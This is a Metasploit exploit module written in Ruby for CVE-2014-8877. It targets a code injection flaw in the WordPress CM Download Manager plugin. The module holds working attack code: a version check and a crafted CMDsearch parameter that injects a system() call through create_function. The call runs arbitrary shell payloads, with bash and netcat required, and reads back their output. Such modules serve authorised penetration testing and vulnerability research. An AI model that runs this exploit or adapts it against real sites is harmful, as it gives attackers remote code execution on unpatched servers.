##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::HTTP::Wordpress

  def initialize(info = {})
    super(update_info(
    info,
    'Name'           => 'Wordpress CM Download Manager plugin (cm-download-manager) code injection',
    'Description'    => %q{
      CM Download Manager plugin does not correctly sanitise the user input which allows remote attackers to execute arbitrary PHP code via the CMDsearch parameter to cmdownloads/, which is processed by the PHP 'create_function' function. Vulnerability was fixed in version 2.0.4
    },
    'Author'         =>
    [
      'Le Ngoc Phi', # initial discovery
      'mzet' # metasploit module
    ],
    'License'        => MSF_LICENSE,
    'References'     =>
    [
      ['CVE', '2014-8877'],
      ['WPVDB', '7679'],
      ['URL', 'http://www.itas.vn/news/code-injection-in-cm-download-manager-plugin-66.html?language=en'],
    ],
    'Privileged'     => false,
    'Payload'        =>
       {
         'Compat'      =>
           {
             'PayloadType' => 'cmd',
             'RequiredCmd' => 'generic bash netcat',
           }
       },
    'Platform'       => ['unix'],
    'Arch'           => ARCH_CMD,
    'Targets'        => [['Automatic', {}]],
    'DefaultTarget'  => 0,
    'DisclosureDate' => 'Nov 14 2014'))
  end

  def check
    check_plugin_version_from_readme('cm-download-manager', '2.0.4')
  end

  def exploit 
    wrapper = "#{rand_text_alpha(10)}"

    vulnUrl = normalize_uri(datastore['TARGETURI'], "cmdownloads")
    p = "\".system(\"echo #{wrapper};#{payload.encoded};echo #{wrapper};\").\""

    res = send_request_cgi({
      'uri'      => vulnUrl,
      'vars_get' =>
      {
        'CMDsearch' => p
      }
    })

    if res
      print_status("The server returned: #{res.code} #{res.message}")

      m = res.body.match(/#{Regexp.escape(wrapper)}\n(.+?)\n#{Regexp.escape(wrapper)}/m)

      if m
        print_status("Command output from the server:")
        print_status(m[1])
      else
        print_status("This server may not be vulnerable")
      end
    else
      print_status("No response from the server")
    end
  end

end

